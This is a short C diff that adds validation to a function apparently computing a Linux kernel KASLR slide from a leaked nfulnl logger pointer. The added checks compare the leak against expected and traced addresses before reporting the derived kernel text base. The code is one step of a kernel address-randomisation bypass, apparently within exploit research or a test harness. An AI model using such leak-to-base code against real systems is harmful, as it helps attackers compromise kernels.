@@ -550,8 +550,21 @@ uint64_t slide_read_stext(void) {
     return 0;
   }
 
+  uint64_t expected = rt_image(SLIDE_NFULNL_LOGGER_IMAGE);
+  if (leaked != expected) {
+    pr_warning("slide unexpected logger value=%016llx expected=%016llx\n",
+               (unsigned long long)leaked,
+               (unsigned long long)expected);
+    return 0;
+  }
+
   uint64_t off = SLIDE_NFULNL_LOGGER_IMAGE - KIMAGE_TEXT_BASE;
   uint64_t stext = leaked - off;
+  if (stext != ktext_rt) {
+    pr_warning("slide base mismatch trace=%016zx leak=%016llx\n",
+               ktext_rt, (unsigned long long)stext);
+    return 0;
+  }
   pr_success("slide boot_id_leaked_nfulnl_logger pid=%d value=%016llx stext=%016llx\n",
              getpid(), (unsigned long long)leaked, (unsigned long long)stext);
   pr_success("slide boot_id-derived_stext pid=%d value=%016llx\n",
